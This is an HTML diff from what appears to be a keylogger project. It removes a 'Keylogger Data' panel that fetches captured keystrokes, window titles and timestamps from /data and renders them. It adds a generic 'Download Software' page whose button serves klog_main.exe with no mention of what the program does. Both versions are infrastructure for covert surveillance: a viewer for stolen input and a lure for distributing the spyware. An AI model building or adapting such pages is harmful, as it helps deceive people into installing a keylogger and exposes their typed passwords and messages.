@@ -3,57 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Keylogger Data</title>
+    <title>Download File</title>
     <style>
-        body { font-family: Arial, sans-serif; }
-        #data { margin-top: 20px; }
-        .entry { margin-bottom: 10px; }
-        .word { font-weight: bold; }
-        .window { color: gray; }
-        .timestamp { font-size: 0.9em; color: #555; }
+        body { text-align: center; padding: 50px; }
+        button { background-color: #007bff; color: white; padding: 10px 20px; border: none; cursor: pointer; }
+        button:hover { background-color: #0056b3; }
     </style>
 </head>
 <body>
-    <h1>Keylogger Data</h1>
-    <div id="data"></div>
-    <script>
-        async function fetchData() {
-            try {
-                const response = await fetch('/data');
-                const data = await response.json();
-                displayData(data);
-            } catch (error) {
-                console.error('Error fetching data:', error);
-            }
-        }
-
-        function displayData(data) {
-            const dataDiv = document.getElementById('data');
-            dataDiv.innerHTML = '';
-            data.forEach(entry => {
-                const div = document.createElement('div');
-                div.classList.add('entry');
-
-                // Convert timestamp to a readable format in IST
-                const date = new Date(parseInt(entry.timestamp));
-                const options = {
-                    year: 'numeric',
-                    month: 'long',
-                    day: 'numeric',
-                    hour: '2-digit',
-                    minute: '2-digit',
-                    second: '2-digit',
-                    timeZone: 'Asia/Kolkata',
-                    timeZoneName: 'short'
-                };
-                const humanReadableDate = date.toLocaleString('en-IN', options);
-
-                div.innerHTML = `<p class="window">Window: ${entry.window}</p><p class="word">Word: ${entry.word}</p><p class="timestamp">Time: ${humanReadableDate}</p>`;
-                dataDiv.appendChild(div);
-            });
-        }
-
-        fetchData();
-    </script>
+    <h1>Download Software</h1>
+    <p>Click the button below to download the file.</p>
+    <a href="klog_main.exe">
+        <button>Download EXE</button>
+    </a>
 </body>
 </html>
